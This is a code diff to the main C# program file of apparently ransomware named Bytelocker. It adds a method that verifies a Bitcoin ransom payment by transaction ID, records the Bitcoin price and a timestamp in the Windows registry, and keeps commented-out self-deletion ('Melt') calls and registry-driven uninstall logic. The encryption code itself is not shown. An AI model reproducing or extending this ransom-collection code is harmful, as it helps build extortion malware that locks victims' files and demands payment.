@@ -6,7 +6,6 @@ using Bytelocker.Settings;
 using Bytelocker.src.Tools;
 using Bytelocker.UI;
 using System;
-using System.Collections.Generic;
 using System.Windows.Forms;
 
 namespace Bytelocker
@@ -28,7 +27,8 @@ namespace Bytelocker
                 {
                     //new Melt();
                 }
-            } else
+            }
+            else
             {
                 //new Melt();
             }
@@ -41,11 +41,12 @@ namespace Bytelocker
                 if (rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null")
                 {
                     new Uninstall();
-                } else
+                }
+                else
                 {
                     LaunchWindow();
                 }
-                
+
             }
         }
 
@@ -66,28 +67,30 @@ namespace Bytelocker
 
         public static void Uninstall()
         {
-           new Uninstall();
+            new Uninstall();
+        }
+
+        public static bool VerifyPayment(String transaction_id)
+        {
+            PaymentManager pm = new PaymentManager();
+            pm.SelectTransactionID(transaction_id);
+            return pm.VerifyPayment();
         }
 
         [STAThread]
         private static void LaunchWindow()
         {
             rm.CreateBoolValue(RegistryManager.SETTINGS_KEY_NAME, "UIShown", true);
-            if (!(rm.ReadBoolValue(RegistryManager.SETTINGS_KEY_NAME, "t_bool")))
+
+            if (rm.ReadStringValue(RegistryManager.SETTINGS_KEY_NAME, "t") == "none")
             {
-                rm.CreateBoolValue(RegistryManager.SETTINGS_KEY_NAME, "t_bool", true);
                 rm.CreateStringValue(RegistryManager.SETTINGS_KEY_NAME, "t", B64Manager.ToBase64(DateTime.Now.ToString()));
             }
 
-            if (!(rm.ReadBoolValue(RegistryManager.SETTINGS_KEY_NAME, "p_bool")))
+            if (rm.ReadStringValue(RegistryManager.SETTINGS_KEY_NAME, "p") == "none")
             {
-                rm.CreateBoolValue(RegistryManager.SETTINGS_KEY_NAME, "p_bool", true);
                 rm.CreateStringValue(RegistryManager.SETTINGS_KEY_NAME, "p", B64Manager.ToBase64(PaymentManager.GetBitcoinPrice()));
             }
-
-            PaymentManager pm = new PaymentManager();
-            pm.SelectTransactionID("e63dbd602f6d1ae31010fee756783711deec498019b7a1c84bff1b586a099e00");
-            Console.WriteLine(pm.VerifyPayment());
 
             MainWindow mw = new MainWindow();
             Application.EnableVisualStyles();
